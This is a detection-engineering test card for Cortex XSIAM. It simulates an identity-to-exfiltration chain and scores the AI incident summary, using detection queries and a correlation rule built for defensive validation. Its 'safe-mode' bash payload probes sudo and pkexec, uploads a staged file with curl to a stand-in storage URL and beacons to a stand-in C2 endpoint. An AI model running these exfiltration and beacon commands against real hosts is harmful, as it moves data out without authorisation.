identity.name: AI SOC Summarization Accuracy & Latency — 72-Minute Identity-to-Exfil Narrative Reconstruction (T1078 / T1059.001 / T1567.002 / T1041)
identity.summary: Compress an identity -> endpoint -> exfil chain into the 72-minute breakout window Unit 42 measured in its fastest cases, then validate that Cortex XSIAM AI (per Cortex product docs, not the post) stitches the multi-plane signals into one incident and summarizes it — naming valid-account initial access, the escalation burst, and the exfil destination (modeled as cloud storage). An F7 test.
identity.description: Unit 42's SOC telemetry shows that in the fastest observed cases attackers now move from initial access to confirmed exfiltration in as little as 72 minutes (a 4X year-over-year acceleration); 65% of initial access is identity-driven, and 87% of incidents force investigators to reason across two or more distinct data sources (complex cases up to ten). Sequential, human-paced triage cannot keep up with that breakout speed; Unit 42 attributes the advantage to real-time, AI-driven cross-source correlation (Managed XSIAM). IMPORTANT — source scoping: the Unit 42 post is cited ONLY for those breakout-speed and identity-driven statistics and for AI-driven correlation. The AI narrative-SUMMARIZATION capability this card exercises — Cortex XSIAM AI stitching the correlated signals into ONE machine-generated incident summary that explicitly names the attack phases — is asserted by Cortex XSIAM product documentation (SRC-PANW-TECHDOCS), NOT by the post, which makes no such claim. This card exercises that F7 KPI end to end. It compresses the signature Muddled Libra (Scattered Spider) identity-driven playbook into a single run: (1) a valid service-account is reused from an anomalous endpoint context (T1078), (2) a scripted-interpreter privilege-escalation burst follows within minutes (T1059.001), and (3) data is staged out and beaconed to an external destination. Second source-scoping note: Unit 42 describes only generic bulk data exfiltration (Spoiled Scorpius moving hundreds of GB within hours); the specific cloud-storage (T1567.002) and C2-channel (T1041) exfil variants modeled here are a POV-engine modeling approximation chosen for a concrete, safe, reproducible run — they are NOT subtechniques the post asserts. No single event is a known-bad IOC; the value proof is that the auto-tuned ABIOCs surface the identity and endpoint deviations, an XQL confirms the egress and that the whole chain fits inside a 4320-second (72-minute) breakout window, and a correlation rule fuses the identity + endpoint + network signals into ONE incident_id. That single incident is what Cortex XSIAM AI narrates (per product docs): the F7 pass condition is that the machine-generated summary is complete and correct — it explicitly names the initial-access phase, the privilege-escalation phase, and the exfiltration destination — AND is produced inside the 72-minute window the intrusion itself took. The DC presents this as proof that Cortex reconstructs a 2-to-10-source narrative in seconds where a sequential SOC would still be pivoting between consoles.

campaigns: Identity-driven intrusions compressing initial-access-to-exfiltration into a ~72-minute breakout window (Unit 42 SOC telemetry, 2025-2026)

execution.framework_reference_id: SIM-EDR-018 — 72-minute identity-to-exfil chain compressed for Cortex XSIAM AI narrative-summarization (F7) validation

prerequisites.description: Cortex XDR / XSIAM agent installed on the target so per-process, command, and network telemetry reaches xdr_data.
A baseline window has elapsed during which the service account ran only its scheduled, non-interactive jobs so Cortex learned the automation-identity profile the reuse deviates from.

payload.code:
# Safe compression of an identity -> endpoint -> exfil chain into a <72-minute
# window. No known-bad payloads and no real bulk exfil: a small SAFE-MODE marker
# file stands in for the 'hundreds of GB' the report describes, sent to an
# authorised internal staging host, never the public internet.
set -euo pipefail
# (1) Initial access — valid service account reused from an interactive context.
bash -ic 'id; echo "[CortexSim] EDR-018 valid-account initial access"' || true
# (2) Privilege-escalation burst via a scripting interpreter (T1059.001 approximated
#     on Linux; pwsh when present, else a bash escalation attempt).
for c in 'sudo -n true' 'id' 'pkexec --version'; do sh -c "$c" >/dev/null 2>&1 || true; done
command -v pwsh >/dev/null 2>&1 && pwsh -NoProfile -Command 'Write-Output cortexsim-edr-018-scripted-escalation' >/dev/null 2>&1 || echo '[CortexSim] EDR-018 scripted escalation (bash fallback)'
# (3) Exfiltration — SAFE-MODE marker to cloud storage (T1567.002) + C2 beacon (T1041).
head -c 4096 /dev/zero | tr '\0' 'A' > /tmp/.cortexsim_edr018_stage
curl -s --max-time 5 -T /tmp/.cortexsim_edr018_stage "${CLOUD_STORAGE_URL:-http://127.0.0.1/cortexsim-exfil}" >/dev/null 2>&1 || true
curl -s --max-time 5 "${C2_URL:-http://127.0.0.1/beacon}" -o /dev/null 2>&1 || true

input_variables.name: CLOUD_STORAGE_URL
input_variables.description: Authorised internal endpoint approximating a cloud-storage bucket the SAFE-MODE marker is PUT to (T1567.002).

input_variables.name: C2_URL
input_variables.description: Authorised internal endpoint approximating the C2 channel the exfil beacon reaches (T1041).

expected_artifacts.description: An interactive shell and scripted-interpreter escalation burst parented under a service account whose learned baseline is non-interactive automation.
expected_artifacts.expected_value: actor_effective_username = "svc-backup" and action_process_image_name in (bash, pwsh, sudo, pkexec)

expected_artifacts.description: Outbound sessions carrying the SAFE-MODE marker to the cloud-storage stand-in and the C2 beacon endpoint within the breakout window.
expected_artifacts.expected_value: source_ip = <target> and dst_host matches the cloud-storage / C2 stand-in

abiocs.name: AI-SOC-72 Valid-Account Reuse From Anomalous Endpoint Context
abiocs.description: A valid service account whose learned Cortex profile is scheduled, non-interactive automation is driven interactively from an endpoint context that deviates from its baseline — the identity-driven initial-access phase (65% of intrusions per Unit 42). ABIOC anchors the deviation to the causality chain (service-account authentication -> interactive shell) rather than any known-bad binary, so hands-on-keyboard reuse of a legitimate account surfaces as the first signal the AI must name as initial access.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_effective_username in ("svc-backup", "svc-identity")
| filter action_process_image_name in ("bash", "sh", "zsh")
| filter action_process_command_line contains "sh -i"
| filter causality_actor_process_image_name in ("sshd", "su", "runuser", "sudo", "login", "systemd")
| comp count() as interactive_sessions by agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id
| filter interactive_sessions >= 1
| fields agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id, interactive_sessions
abiocs.causality_anchor: Learned automation-identity baseline (scheduled cron jobs, no interactive shell) -> service-account authentication -> interactive endpoint session that diverges from the baseline, anchored to the originating auth as the initial-access phase.

abiocs.name: AI-SOC-72 Rapid Privilege Escalation After Valid-Account Compromise
abiocs.description: Within minutes of the anomalous valid-account session, the account runs a scripted-interpreter escalation burst (sudo / pkexec / PowerShell-style encoded execution) at a cadence and privilege-seeking shape its learned baseline never exhibits. Every binary is legitimate; the ABIOC fires on the escalation-diversity deviation, anchored to the interactive shell that spawned it — the privilege-escalation phase the AI narrative must name second.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_effective_username in ("svc-backup", "svc-identity")
| filter action_process_image_name in ("sudo", "su", "pkexec", "pwsh", "powershell")
| filter causality_actor_process_image_name in ("bash", "sh", "zsh", "sshd", "su", "runuser")
| comp count_distinct(action_process_image_name) as escalation_tools by agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id
| filter escalation_tools >= 2
| sort desc escalation_tools
| fields agent_hostname, actor_effective_username, causality_actor_process_image_name, causality_id, escalation_tools
abiocs.causality_anchor: Interactive shell under the compromised valid account (the sshd->shell CGO) -> rapid fan-out of distinct escalation utilities that exceeds the account's learned process diversity, keyed on causality_actor_process_image_name (the spawning shell) + causality_id so the burst is provably a lineage descendant of the same initial-access chain, not an unrelated cluster of elevated processes — the privilege-escalation phase the AI narrative names second.

xql_queries.name: AI-SOC-72 Exfiltration to Cloud Storage From Compromised Host
xql_queries.query:
dataset = pan_ngfw_traffic
| filter _time > to_timestamp(current_time() - 4320)
| filter dst_host contains "s3.amazonaws.com" or dst_host contains ".s3." or dst_host contains "storage.googleapis" or dst_host contains "blob.core.windows" or dst_host contains "cortexsim-exfil"
| comp sum(bytes_sent) as egress_bytes, count() as sessions by source_ip, dst_host
| filter egress_bytes >= 512
| sort desc egress_bytes
| fields source_ip, dst_host, egress_bytes, sessions

xql_queries.name: AI-SOC-72 Breakout-Window Timing From Identity to Exfil
xql_queries.query:
dataset = xdr_data
| filter _time > to_timestamp(current_time() - 4320)
| filter actor_effective_username in ("svc-backup", "svc-identity", "www-data", "nobody")
| comp min(_time) as first_signal, max(_time) as last_signal by agent_hostname, actor_effective_username
| alter breakout_seconds = last_signal - first_signal
| filter breakout_seconds <= 4320
| fields agent_hostname, actor_effective_username, first_signal, last_signal, breakout_seconds

correlation_rules.name: AI-SOC-72 Identity-to-Exfil Breakout Stitch (Narrative Source Incident)
correlation_rules.logic: ABIOC(AI-SOC-72 Valid-Account Reuse From Anomalous Endpoint Context) AND ABIOC(AI-SOC-72 Rapid Privilege Escalation After Valid-Account Compromise) AND XQL(AI-SOC-72 Exfiltration to Cloud Storage From Compromised Host), stitched across two declared causality edges: (1) a process_lineage pivot binding the interactive-shell initial access and the escalation burst to the SAME sshd->shell CGO via shared causality_actor_process_image_name + causality_id (the escalation is a lineage descendant of the reused-account shell, not a time-coincident cluster); and (2) an endpoint_network_stitch pivot joining the endpoint exfil process to its outbound NGFW session so the incident spans ENDPOINT + NDR. Joined on the same agent_hostname and actor_effective_username within a 4320-second (72-minute) breakout window, they fuse into a single identity-to-exfiltration incident_id. This is the one incident Cortex XSIAM AI narrates: the auto-generated summary must name valid-account initial access (T1078), the scripted privilege-escalation burst (T1059.001), and the cloud-storage exfiltration destination (T1567.002 with T1041 beacon) inside the same window the intrusion took.

dataset = xdr_data | filter actor_effective_username = "svc-backup" | filter action_process_image_name in ("bash", "sudo", "pkexec", "pwsh")

use_cases.name: AI SOC Narrative Reconstruction & Triage Latency Under the 72-Minute Breakout Window
use_cases.description: Cortex XSIAM AI stitches an identity-driven, multi-plane intrusion into one incident and auto-generates a narrative summary that a sequential, human-paced SOC could not assemble before the attacker finishes exfiltrating. The DC proves both accuracy (all three phases + the exfil destination named) and latency (produced inside the 72-minute window).

test_cases.objective: The multi-plane signals stitch into one incident_id and Cortex XSIAM AI generates a complete, correct narrative naming all three phases and the exfil destination inside the 72-minute window.
preconditions: EDR target with the Cortex Linux agent installed and NGFW/network telemetry ingested.
Baseline window elapsed with the service account running only scheduled jobs.
steps: Compress the identity -> endpoint -> exfil chain into a single sub-72-minute run.
Observe both ABIOCs and the exfil XQL fire and CR-EDR-0018 raise one incident.
Read the XSIAM-AI incident summary and score narrative completeness against the required phases.
success_criteria: Correlation CR-EDR-0018 raises exactly one incident_id spanning ENDPOINT + NDR planes.
The AI-generated summary explicitly names valid-account initial access, the privilege-escalation burst, and the cloud-storage exfiltration destination.
The summary is produced within the 4320-second (72-minute) breakout window.

test_cases.objective: The breakout-window timing metric confirms the whole chain compressed inside 72 minutes so the latency KPI is measured, not assumed.
preconditions: TC-EDR-018A executed on the same target.
steps: Run the AI-SOC-72 Breakout-Window Timing XQL over the run window.
Confirm breakout_seconds <= 4320 for the compromised account.
success_criteria: The timing XQL returns the compromised account with breakout_seconds <= 4320.
The exfil XQL shows egress to the cloud-storage / C2 stand-in within the same window.

preventive_controls: Deny interactive shells for service/automation accounts (set login shell to /usr/sbin/nologin, enforce via PAM) so identity-driven hands-on-keyboard reuse is blocked, not merely detected.
Require phishing-resistant MFA and tightly scope + rotate service-account credentials to raise the cost of the identity-driven initial access that starts the 72-minute clock.
Enforce egress controls and DLP on cloud-storage destinations so bulk staging to S3/GCS/Blob is blocked or throttled inside the breakout window.
detection_engineering: Let Cortex auto-tune ABIOCs against each identity's learned process and command baseline rather than hand-authoring static rules for the individual LOLBins involved.
Stitch identity, endpoint, and network signals from one principal into a single incident within a breakout-length window so the AI summarizer has one causality chain to narrate.
Track AI-summary completeness (initial access + privilege escalation + exfil destination named) and time-to-summary against the 72-minute breakout window as the F7 triage KPI.
